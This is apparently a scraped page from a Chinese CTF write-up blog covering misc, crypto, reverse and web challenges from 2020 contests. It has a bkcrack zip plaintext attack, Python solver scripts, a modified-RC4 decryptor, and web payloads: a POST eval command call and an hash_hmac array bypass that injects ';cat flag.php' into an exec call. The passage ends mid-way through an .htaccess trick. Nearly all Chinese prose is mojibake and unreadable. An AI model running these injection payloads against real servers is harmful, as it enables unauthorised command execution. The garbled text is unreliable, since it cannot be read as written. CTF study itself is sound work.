ç»“åˆHint2å’ŒHint3ï¼Œä½¿ç”¨bkcrackå·¥å…·ç…§æ­¥éª¤å¤ç°å³å¯ã€‚ æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ä¿¡æ¯ï¼šunzip -Z Triglavian.zip è·å–CRCå€¼ï¼šunzip -Z -v Triglavian.zip Triglavian.png | grep CRCï¼ˆ2c810480ï¼‰ ç”Ÿæˆæ˜æ–‡éƒ¨åˆ†æ–‡ä»¶ï¼šecho -n -e &#39;\\x2c\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52&#39; &gt; header.txt æ˜æ–‡æ”»å‡»ï¼š./bkcrack -C Triglavian.zip -c Triglavian.png -p header.txt -o -1 çº¦20+minå¾—åˆ°å¯†é’¥ï¼šbe056038 a143c0c 1ea08ca5 è¿˜åŸå‡ºåŸæ–‡ä»¶ï¼š./bkcrack -C Triglavian.zip -c Triglavian.png -k be056038 a143c0c 1ea08ca5 -d Triglavian.png å¥‡æ€ªçš„ç¼–ç è‚¯å®šæ˜¯flagï¼Œç”¨å…³é”®å­—â€œTriglavian å¯†ç â€çŸ¥ä¸ºæ·±æ¸Šä¸‰ç¥è£”å­—ä½“(Triglavian fonts)ï¼Œä¹Ÿå«ç‰¹æ ¼æ‹‰æ–‡ï¼Œå¯¹ç…§å¯†ç è¡¨è§£ç ï¼ˆä¿®æ”¹å…¶ä¸­çš„gä¸ºGï¼‰ã€‚ å‚è€ƒï¼š http://eve.netease.com/forum.php?mod=viewthread&amp;tid=6742 https://www.ackurdeeve.com/201902/triglavianfonts/ â€‹ é™„åŠ misc_é—®é’å¤© æ˜æœˆå‡ æ—¶æœ‰ï¼Œæ‹¿é¥¼é—®é’å¤© å¯†ç ä¸ºä½ å¬åˆ°çš„ä¸€å¥è¯ ç¨å¾®æœ‰ç‚¹éš¾åº¦ æ ¹æ®ç°å®æ”¹ç¼– ä¸œæ–½æ•ˆé¢¦è€Œå·² é™„ä»¶ï¼šwelcome.zip Hint1: gifå›¾ç‰‡ä¸­ä¸¤ä¸ªå­—æ¯oä»£è¡¨æ°¢åŸå­çš„èƒ½çº§ï¼Œå½“æ°¢åŸå­çš„ç”µå­å‘ç”Ÿèƒ½çº§è·ƒè¿æ—¶ï¼Œé—´éš”ä¸º10äº¿åˆ†ä¹‹7ç§’ Hint2: å°å§å§å£°éŸ³æ˜¯aiffæ ¼å¼ åˆ†ç¦»gifå›¾ç‰‡ï¼Œå¾—åˆ°ä¸¤å¸§å¯¹åº”çš„bmpå›¾ç‰‡ï¼Œ 16è¿›åˆ¶æŸ¥çœ‹gifæ–‡ä»¶ï¼Œç»“åˆHint2ï¼Œå¯ä»¥åˆ†ç¦»å‡º1ä¸ªjpgå›¾ç‰‡æ–‡ä»¶+1ä¸ªaifféŸ³é¢‘æ–‡ä»¶+1ä¸ªåŠ å¯†zipæ–‡ä»¶ã€‚ bmpå›¾ç‰‡å’Œjpgå›¾ç‰‡å‡æœ‰ç‰¹æ®Šç¬¦å·ï¼Œæš‚ä¸çŸ¥ç”¨å¤„ã€‚ æ’­æ”¾aifféŸ³é¢‘ï¼Œå°†é€Ÿåº¦è°ƒæ…¢ï¼Œå¾—åˆ°å†…å®¹â€œæ¬¢è¿ctfshowçš„å°å“¥å“¥æ¥ç©â€ï¼Œå¯è§£å¯†zipæ–‡ä»¶ï¼Œå¾—åˆ°1ä¸ªpngå›¾ç‰‡æ–‡ä»¶ã€‚ã€ å°è¯•é•¿æ¢1çŸ­æ¢0ï¼ŒäºŒè¿›åˆ¶è½¬æ¢å­—ç¬¦ï¼Œå‘ç°å°±æ˜¯flagã€‚ åŸæ¥Hint1å’Œbmp+jpgå›¾ç‰‡éƒ½æ˜¯è™šæ™ƒä¸€æªï¼Œè¾›è‹¦ç¾¤ä¸»PSäº†å•Šâ€¦ â€‹ CRYPTOcrypto1_ä¸­ç§‹æœˆ æ­¤å¤œä¸­ç§‹æœˆï¼Œæ¸…å…‰åä¸‡å®¶ è‡ªåŠ¨é’¥åŒ™âŠ• æ˜æ–‡å…¨å¤§å†™ï¼Œå¾—åˆ°åè½¬å°å†™ï¼Œå¹¶ä»¥_è¿æ¥å•è¯ã€‚ æ ¼å¼ï¼šflag{xxx}ã€‚ Hint1: æŸå¤å…¸å¯†ç  Hint2: ç»æ­¤å¤å…¸å¯†ç åŠ å¯†åï¼Œå¯†æ–‡è¿˜æ˜¯å¤§å†™ Hint3: è¯¥å¤å…¸å¯†ç çš„å¯†é’¥å½¢å¼ï¼škeyword+plaintext (+plaintextâ€¦+plaintext) ï¼ˆå†…å®¹éƒ¨åˆ†å¼•ç”¨æœˆé¥¼ç‹å¸ˆå‚…wp æ‡’â€¦ï¼‰ Autokeyå¯†ç +å¼‚æˆ–æ“ä½œã€‚ å…ˆçˆ†ç ´å¾—åˆ°å¼‚æˆ–ç»“æœï¼š 123456789s=&#x27;fsskryenvkm~jl&#123;ejs&#125;jwflzsnpgmifq&#123;&#123;j&#123;|suhzrjppnx|qvixt~whu&#x27;for i in range(255): res=&#x27;&#x27; for j in range(0,len(s)): temp = ord(s[j])^i if 65&lt;=temp&lt;=90 or 97&lt;=temp&lt;=122: #ç”±å¤§å°å†™å­—æ¯æ„æˆ res += (chr(temp)) if len(res)==len(s): print(res) ç»“åˆHint2ï¼Œå‘ç°å…¨å¤§å†™å­—ç¬¦ä¸²ï¼šYLLTMFZQITRAUSDZULBUHYSELQOXRVYNDDUDCLJWEMUOOQGCNIVGKAHWJã€‚ å†ä¸ŠAutokeyçˆ†ç ´è„šæœ¬ï¼Œå¾—keyï¼šKEYFORFLAGï¼Œæ˜æ–‡ï¼šOHNOYOUFINDTHEFLAGTHEFLAGFORYOUISDOYOULIKECLASSICALCIPHER â€‹ crypto2_æœˆè‡ªåœ† ä¸–è¿œäººä½•åœ¨ï¼Ÿå¤©ç©ºæœˆè‡ªåœ†ã€‚ Baby (Donâ€™t) Cry ï¼ˆå†…å®¹éƒ¨åˆ†å¼•ç”¨æœˆé¥¼ç‹å¸ˆå‚…wp æ‡’â€¦ï¼‰ æ˜æ–‡é•¿åº¦ä¸º71ä½ï¼ŒåŠ å¯†åä¸º142ä½ã€‚è¿™é‡Œç”±äºaä¸å¤§ï¼Œsalté•¿åº¦ä¹Ÿä¸é•¿ï¼Œä¸”æ˜æ–‡mä¸­å­˜åœ¨flagï¼Œæ­£å¥½å¯ä»¥ç”¨è¿™å‡ ä½å»çˆ†ç ´å‡ºaå’Œsaltã€‚flagåœ¨æ˜æ–‡mä¸­çš„ä½ç½®æ˜¯53ï¼Œå¯¹åº”å¯†æ–‡cä¸­çš„ä½ç½®æ˜¯105ã€‚flagå‡ºç°çš„ä½ç½®æ­£å¥½å¯¹åº”saltçš„ä½ç½®ã€‚ å†™è„šæœ¬çˆ†å‡ºaå’Œsaltï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import stringlower = string.printable[10:36]x0=set()y0=dict()for a in range(50,101): for s0 in lower: if hex((102*a+ord(s0)) % 128) == &#x27;0x1c&#x27;: x0.add(a) y0[a]=s0x1=set()y1=dict()for a in range(50,101): for s1 in lower: if hex((108*a+ord(s1)) % 128) == &#x27;0x29&#x27;: x1.add(a) y1[a]=s1x2=set()y2=dict()for a in range(50,101): for s2 in lower: if hex((97*a+ord(s2)) % 128) == &#x27;0x56&#x27;: x2.add(a) y2[a]=s2 x3=set()y3=dict()for a in range(50,101): for s3 in lower: if hex((103*a+ord(s3)) % 128) == &#x27;0x66&#x27;: x3.add(a) y3[a]=s3a=(x0&amp;x1&amp;x2&amp;x3).pop()print(a)print(y0[a])print(y1[a])print(y2[a])print(y3[a]) å¾—åˆ°åï¼Œè§£å¯†ï¼š 12345678910111213141516a = 67si=b&#x27;jesq&#x27;si=list(si)print(si)c = &#x27;3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a&#x27;cc=list()for i in range(len(c)//2): cc.append(int(c[2*i:2*i+2],16))print(cc)flag=&#x27;&#x27;for i in range(len(cc)): for m in range(0,127): if (m*a+si[i%4])%128 == cc[i]: flag+=chr(m)print(flag) â€‹ crypto3_å¤šå°‘ç¦»æ€€ å¤šå°‘ç¦»æ€€èµ·æ¸…å¤œï¼Œäººé—´é‡æœ›ä¸€å›åœ†ã€‚ Weird Î“(x)? Hint1: æ³¨æ„ä¼½é©¬å‡½æ•°Î“(x)å’Œé˜¶ä¹˜x!çš„å…³ç³»å¼ Hint2: å¨å°”é€Šå®šç† ï¼ˆå†…å®¹éƒ¨åˆ†å¼•ç”¨æœˆé¥¼ç‹å¸ˆå‚…wp æ‡’â€¦ï¼‰ æˆ‘ä»¬éœ€è¦æ±‚gamma(B+2)%Aï¼Œæ ¹æ®ä¼½é©¬å‡½æ•°Î“(x)å’Œé˜¶ä¹˜x!çš„å…³ç³»å¼å¯çŸ¥(B+1)! % Aã€‚è€Œæ ¹æ®å¨å°”é€Šå®šç†å¯çŸ¥(A-2)! % A = 1ã€‚ä»¤x = (A-2)!/(B+1)!ï¼Œy = (B+1)!ï¼Œæ‰€ä»¥x * y â‰¡ 1 (mod A)ã€‚è€Œæˆ‘ä»¬éœ€è¦æ±‚çš„æ˜¯y % Aï¼Œyæ˜¯xå…³äºAçš„é€†å…ƒã€‚æ‰€ä»¥æ±‚x % Açš„é€†å…ƒå³å¯ã€‚è¿™é‡Œç”±äºAã€Bç›¸å·®è¿˜ä¸åˆ°10ä¸‡ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“æ±‚è§£å‡ºx % Aã€‚ 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import getPrime,isPrimeimport gmpy2def nextPrime(n): n += 2 if n &amp; 1 else 1 while not isPrime(n): n += 2 return n def factorial_mod(A,B): ans = 1 tmp = pow(-1,1,A) for i in range(B+1,A): ans = (ans*gmpy2.invert(i,A))%A return (ans*tmp)%A pA = 6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789pB = 6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147qA = 7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291qB = 7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457n = 4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119c = 1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374e = 0x10001p = nextPrime(factorial_mod(pA,pB+1))q = nextPrime(factorial_mod(qA,qB+1))r=gmpy2.iroot(n//(p*q*q),3)[0]phi=(p-1)*q*(q-1)*r*r*(r-1)d=gmpy2.invert(e,phi)flag=gmpy2.powmod(c,d,n)import binasciiprint(binascii.unhexlify(hex(flag)[2:])) â€‹ REVERSEre1_è¥¿åŒ—æœ›ä¹¡ è¥¿åŒ—æœ›ä¹¡ä½•å¤„æ˜¯ï¼Œä¸œå—è§æœˆå‡ å›åœ†ã€‚ é™„ä»¶ï¼šre IDAåç¼–è¯‘ï¼Œmainå‡½æ•°ä¸­å…³é”®ä»£ç ï¼š ä»£ç é€»è¾‘ï¼š flagé•¿åº¦45ï¼Œå–flagçš„ç¬¬3ã€6ã€13ã€36ä¸ªå­—ç¬¦å€¼åŠ13å…±äº”ä¸ªæ•°ä½œä¸ºkeyï¼Œå‡è®¾ä¸º $k_0,k_1,k_2,k_3,k_4$ï¼› ç¬¬ä¸€ä¸ªforå¾ªç¯åˆ†åˆ«è®¡ç®— $k_4^5,k_3^4,k_2^3,k_1^2,k_0^1$ï¼Œå­˜å…¥bæ•°ç»„ï¼š$b_0,b_1,b_2,b_3,b_4=k_4^5,k_3^4,k_2^3,k_1^2,k_0^1$ï¼› ç¬¬äºŒä¸ªforå¾ªç¯å°†flagåˆ†ä¸º9ç»„ï¼Œæ¯ç»„5ä¸ªå­—ç¬¦ï¼Œå¯¹æ¯ç»„å­—ç¬¦ï¼Œå‡è®¾è¯¥ç»„å­—ç¬¦ä¸º $c_0,c_1,c_2,c_3,c_4$ï¼Œè®¡ç®— $\\sum=c_0b_0+c_1b_1+c_2b_2+c_3b_3+c_4b_4=c_0k_4^5+c_1k_3^4+c_2k_2^3+c_3k_1^2+c_4k_0$ æœ€ååˆ¤æ–­9ä¸ªæ±‚å’Œå¾—åˆ°çš„å€¼æ˜¯å¦ä¸arræ•°ç»„ç›¸ç­‰ã€‚ ç”±äºflagå‰äº”å­—ç¬¦ä¸ºflag&#123;ï¼Œå³ä¸ºç¬¬1ç»„ï¼Œ æœ‰k0=ord(&#39;g&#39;)ï¼Œåˆk4å·²çŸ¥ï¼Œå¯ä»¥çˆ†ç ´keyä¸­çš„ k1ã€k2å’Œk3å€¼ï¼š 1234567891011121314import stringdic=string.ascii_lowercase+&#x27;_&#x27;arr=[11377526307,11291274669,10667335421,12105207237,12005384512,10853488462,12005544354,10651566902,5399147315,11333307]for x in dic: for y in dic: for z in dic: k=ord(&#x27;f&#x27;)*(13**5)+ord(&#x27;l&#x27;)*(ord(x)**4)+ord(&#x27;a&#x27;)*(ord(y)**3)+ord(&#x27;g&#x27;)*(ord(z)**2)+ord(&#x27;&#123;&#x27;)*ord(&#x27;g&#x27;) if k==arr[0]: print(x,y,z)#101 101 107#x=k3=101#y=k2=101#z=k1=107 æ•… key=[103,107,101,101,13] ç…§è‘«èŠ¦ç”»ç“¢ï¼Œå¯¹å‰©ä¸‹8ç»„æ¯ç»„åˆ†åˆ«çˆ†ç ´å³å¯ï¼š ï¼ˆçº¯å°å†™å­—æ¯+_æƒ…å†µä¸‹æœ€åä¸€ç»„æ— ç»“æœï¼Œå¢åŠ æ•°å­—ï¼‰ 12345678910111213141516171819202122232425262728293031323334import stringdic=string.ascii_lowercase+&#x27;_&#x27;key=[103,107,101,101,13]arr=[11377526307,11291274669,10667335421,12105207237,12005384512,10853488462,12005544354,10651566902,5399147315,11333307]def bruteforce_mid(val): for a in dic: for b in dic: for c in dic: for d in dic: for e in dic: sum=ord(a)*(key[4]**5)+ord(b)*(key[3]**4)+ord(c)*(key[2]**3)+ord(d)*(key[1]**2)+ord(e)*key[0] if sum==val: return a+b+c+d+e def bruteforce_last(val): dic=dic=string.ascii_lowercase+string.digits+&#x27;_&#x27; for a in dic: for b in dic: for c in dic: for d in dic: sum=ord(a)*(key[4]**5)+ord(b)*(key[3]**4)+ord(c)*(key[2]**3)+ord(d)*(key[1]**2)+ord(&#x27;&#125;&#x27;)*key[0] if sum==val: return a+b+c+d+&#x27;&#125;&#x27;flag=&#x27;flag&#123;&#x27;for i in range(1,8): flag+=bruteforce_mid(arr[i]) print(flag)flag+=bruteforce_last(arr[8])print(flag)#flag&#123;okok_here_is_your_flag_where_are_my_36d&#125; â€‹ re2_å½’å¿ƒ æ»¡æœˆé£æ˜é•œï¼Œå½’å¿ƒæŠ˜å¤§åˆ€ ä½ åº”è¯¥è§è¿‡pythonä»£ç æ‰“åŒ…æˆçš„exeï¼ŒçŒœçŒœè¿™æ˜¯ä»€ä¹ˆè¯­è¨€ é™„ä»¶ï¼šreadme.zip æ‹–å…¥IDAæŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°java.exe/openjdk/jreå­—æ ·ï¼ŒçŒœæµ‹ä¸ºjavaæ‰“åŒ…æˆçš„jarè½¬çš„exeæ–‡ä»¶ã€‚ jarè½¬exeå¤§å¤šä½¿ç”¨exe4jå·¥å…·ï¼Œexe4jåªæ˜¯å°†javaç¨‹åºï¼Œä½¿ç”¨è‡ªå·±çš„æ–¹å¼æ‰“åŒ…äº†ä¸€ä¸‹è€Œå·²ï¼Œæ‰€ä»¥è¿è¡Œçš„æ—¶å€™è¿˜æ˜¯ä¼šè½¬æˆjaræ¥è¿è¡Œï¼Œè€Œjaræ–‡ä»¶å¿…å®šå­˜å‚¨åœ¨æœ¬åœ°çš„å›ºå®šä½ç½®ã€‚æ‰€ä»¥åç¼–è¯‘çš„æ­¥éª¤å¦‚ä¸‹ï¼š è¿è¡Œexeç¨‹åºï¼› åˆ°Cç›˜æœç´¢readme.jarï¼Œæ‰¾åˆ°å®ƒåŠå…¶ä¾èµ–jaråŒ…ï¼ˆç”¨Everythingå¯å¿«é€Ÿæœç´¢ï¼‰ï¼› ä½¿ç”¨jd-guiåç¼–è¯‘readme.jarï¼ŒæŸ¥çœ‹æºç æ‰¾åˆ°flagã€‚ â€‹ re3_è‹¥æ— æœˆ æ­¤å¤œè‹¥æ— æœˆï¼Œä¸€å¹´è™šè¿‡ç§‹ misc2åç»­æ•…äº‹ä½ æ‰€çœ‹åˆ°çš„ï¼Œæ˜¯ä¸€ä¸ªè¢«ç¥ç§˜åŠ›é‡å…¥ä¾µçš„å±å¹•flagæ ¼å¼ä¸ºflag/your_flag/ Hint1: base64 is trap Hint2: é¢„æœŸè§£æ³•hint:é­”æ”¹RC4è®¤å¯çš„éé¢„æœŸè§£æ³•hint:1/192å‡ ç‡ç›´æ¥æ˜¾ç¤ºflag èµ›åå¯¹ç…§ç€RC4ç®—æ³•å•ƒåšå‡ºã€‚ IDA-F5æ‰¾åˆ°å…³é”®å­—â€œTriglavianâ€+ä¸€ä¸²ç±»ä¼¼base64å¯†æ–‡+ä¸€ä¸²ç±»ä¼¼base64ç è¡¨ï¼Œè·Ÿè¿›å…³é”®å­—è¿›å…¥sub_401360å‡½æ•°ï¼Œåœ¨case 1uå†…æ‰¾åˆ°å…³é”®ä»£ç ï¼š å¯¹ç…§æ ‡å‡†RC4ç®—æ³•ï¼š RC4ç®—æ³•åŒ…æ‹¬åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰å’Œä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGAï¼‰ä¸¤å¤§éƒ¨åˆ†ã€‚(RC4 algorithm including initialization algorithm (KSA) and pseudo-random sub-password generation algorithm (PRGA) two parts.) 1234567891011121314151617181920212223242526272829303132333435363738394041def KSA(key): keylength = len(key) S = range(256) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 256] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: key = &#x27;Key&#x27; plaintext = &#x27;Plaintext&#x27; def convert_key(s): return [ord(c) for c in s] key = convert_key(key) keystream = RC4(key) import sys for c in plaintext: sys.stdout.write(&quot;%02X&quot; % (ord(c) ^ keystream.next())) print sub_401360å‡½æ•°ä¸­å®ç°äº†KSAéƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°æ”¹åŠ¨äº†åˆå§‹keyæ•°ç»„ï¼ˆä½¿ç”¨çš„newkeyæ•°ç»„ä¸ºaTriglavianå˜é‡ä¸­å„å­—æ¯å¯¹åº”ç è¡¨çš„ä¸‹æ ‡å€¼ï¼Œè€Œéç®€å•çš„å­—æ¯å¯¹åº”ASCIIå€¼ï¼‰å’Œæ•°ç»„å¤§å°ï¼ˆä½¿ç”¨64ï¼Œé256ï¼‰ã€‚ å†å¾€ä¸‹çœ‹æœªå‘ç°PRGAéƒ¨åˆ†ï¼Œå›åˆ°æ±‡ç¼–ä»£ç æ–‡æœ¬è§†å›¾ï¼Œå…¨å±€æœç´¢S[ï¼Œå‘ç°å¦ä¸€ä¸ªå‡½æ•°sub_401160ä¹Ÿå­˜åœ¨ï¼š è·Ÿè¿›sub_501160å‡½æ•°ï¼Œå‘ç°RC4ç®—æ³•çš„PRGAéƒ¨åˆ†ï¼š å¯ä»¥å‘ç°æœ€åçš„å¼‚æˆ–éƒ¨åˆ†ï¼Œé€‰å–å¯†æ–‡ä¸­æ¯ä¸ªå­—æ¯ï¼Œå¾—åˆ°å¯¹åº”ç è¡¨çš„ä¸‹æ ‡å€¼kï¼Œä¸æ ‡å‡†ç”Ÿæˆçš„å¯†é’¥æµS[(S[i] + S[j]) % 64]å¼‚æˆ–åå¾—åˆ°æ–°ä¸‹æ ‡å€¼ï¼Œæ›¿æ¢æˆç è¡¨ä¸­å¯¹åº”çš„å­—æ¯ã€‚ç”±äºRC4çš„å¯¹ç§°æ€§ï¼Œç»“æœå³ä¸ºæ˜æ–‡ã€‚ é­”æ”¹RC4è§£å¯†è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152key = &#x27;Triglavian&#x27;lenk = len(key)cipher = &#x27;20c1LOP2FnBOCMhPbCdtXTHmpgoK7g1sPN0KCcaBs3sWx/5Bob1t6IJaahW6SUGpTW11DmhJGeTj3UCSPCOZYaLw9qmg80kN56XF+dNhBYlfKbWqwSKJl+zTBvH0yBLDy7nwJ1W/SeBW+LaUV1Dq4FRnogzD5FOHNknyfyMerA3o5lgRq03f2M5C7ixuJ6WK&#x27;dict = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;newkey = [-1]*64def KSA(key): S = list(range(64)) j = 0 for i in range(64): j = (j + S[i] + newkey[i]) % 64 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 64 j = (j + S[i]) % 64 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 64] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: i = 0 while 1: j = 0 while key[i%lenk] != dict[j]: j += 1 if j &gt;= 64: break newkey[i] = j i += 1 if i &gt;= 64: break print(newkey) #newkey = [19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32] keystream = RC4(newkey) flag = &#x27;&#x27; for c in cipher: flag += dict[dict.find(c) ^ keystream.__next__()] print(flag) â€‹ PWNpwn_å¤©æ¶¯å…±æ­¤æ—¶ æµ·ä¸Šç”Ÿæ˜æœˆï¼Œå¤©æ¶¯å…±æ­¤æ—¶ é™„ä»¶ï¼špwn.zip çº¯ç²¹ä¸ä¼šï¼Œä»…æ˜¯ç•™å‘ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"match-2020å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2020-09-10T15:56:20.000Z","updated":"2020-09-11T15:07:37.611Z","comments":true,"path":"2020/09/10/match-2020å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›/","permalink":"https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ WEBeasycon ä¸€çªèš‚èšå¤§æ¦‚æœ‰500-2000åªï¼Œè€Œæ¢µè’‚å†ˆåªæœ‰800äººï¼Œå¦‚æœè¿™çªèš‚èšå…¥ä¾µæ¢µè’‚å†ˆï¼Œä»–ä»¬è¦æç€èœåˆ€æ‰èƒ½è§£å†³è¿™ç¾¤èš‚èšï¼Œä½†æ˜¯ä½ å¹¶ä¸å…³å¿ƒä½ åªå…³å¿ƒä½ è‡ªå·± 183.129.189.60:10021 å¾¡å‰‘æ‰«æå‡ºindex.phpé¡µé¢ï¼Œè®¿é—®æç¤ºeval post cmdï¼Œ POSTä¼ å‚cmd=system(&quot;ls -al&quot;);å‘ç°å½“å‰ç›®å½•ä¸‹æœ‰æ–‡ä»¶bbbbbbbbb.txtï¼š å›åˆ°é¡µé¢è®¿é—®ï¼Œå¾—åˆ°ä¸€ä¸²base64å›¾ç‰‡åç¼€å­—ç¬¦ä¸²ï¼ŒåŠ ä¸Šbase64å¤´data:image/png;base64,ï¼Œåœ¨URLè®¿é—®å¾—åˆ°å›¾ç‰‡ä¸­æ˜¾ç¤ºçš„flagï¼š flag: GWHT{do_u_kn0w_c@idao} â€‹ BlackCat çœ¼ç›çªå¾—åƒé“œé“ƒ 183.129.189.60:10022 æŸ¥çœ‹æºç å‘ç°æç¤ºéƒ½è¯´å¬å¬æ­Œäº†ï¼ï¼Œä¸‹è½½mp3æ–‡ä»¶æŸ¥çœ‹16è¿›åˆ¶ï¼Œå‘ç°æœ€åæœ‰å…³é”®æºç ï¼š 1234567891011121314151617if(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123; die(&#x27;è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼&#x27;);&#125;$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST[&#x27;White-cat-monitor&#x27;])) $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123; die(&#x27;æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚&#x27;);&#125;echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]); éœ€ä¼ å…¥ä¸‰ä¸ªå‚æ•°Black-Cat-Sheriffï¼ŒOne-earï¼ŒWhite-cat-monitorï¼Œç”¨ç¯å¢ƒå˜é‡clandestineçš„å€¼ä½œä¸ºkeyå¯¹White-cat-monitorå€¼è¿›è¡Œsha256å“ˆå¸Œè¿ç®—ï¼Œå¾—åˆ°çš„ç»“æœå†ä½œä¸ºkeyç”¨æ¥å¯¹One-earå€¼è¿›è¡Œsha256å“ˆå¸Œè¿ç®—ï¼Œç»“æœä¸Black-Cat-Sheriffç›¸ç­‰åˆ™æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚ åˆ©ç”¨hash_hmacå‡½æ•°ä¼ å…¥æ•°ç»„è¿”å›falseçš„ç¼ºé™·ï¼š 12$hmac = hash_hmac(&#x27;sha256&#x27;, Array(), &quot;SecretKey&quot;);echo $hmac == false; ä¼ å…¥æ•°ç»„è¿”å›falseï¼Œå†æ¬¡è¿ç®—æ—¶åˆ™æ— éœ€keyå³å¯ç›´æ¥å¾—åˆ°sha256å“ˆå¸Œè¿ç®—å€¼ã€‚ é€šè¿‡ä¿®æ”¹One-earå‘½ä»¤åŠå¯¹åº”çš„Black-Cat-Sheriffå€¼ï¼Œæœ€åæ‹¿åˆ°flagã€‚ payload: White-cat-monitor[]=&amp;One-ear=;cat flag.php&amp;Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6 flag: GWHT{y0u_mu3t_p@y_atTentiou_!0_lt} å‚è€ƒï¼šSPOT THE BUG CHALLENGE 2018 WARM-UP â€‹ easyphp Easyphp 183.129.189.60:10023 é¢˜ç›®é€»è¾‘ï¼š è®¿é—®æ—¶æ¸…é™¤ç›®å½•ä¸‹é™¤index.phpæ–‡ä»¶å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œä¸”åªèƒ½å†™ä¸€æ¬¡ï¼›å¦å¤–é™åˆ¶å­—ç¬¦ä¸ºa-zå’Œ.ï¼Œåªæœ‰index.phpæ–‡ä»¶è§£æï¼Œ è€ƒè™‘å†™å…¥.htaccessæ–‡ä»¶ï¼Œæ‹†å¼€å…³é”®å­—ç”¨\\æ¢è¡Œä»¥ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œåˆ©ç”¨ php_value auto_prepend_file .htaccess 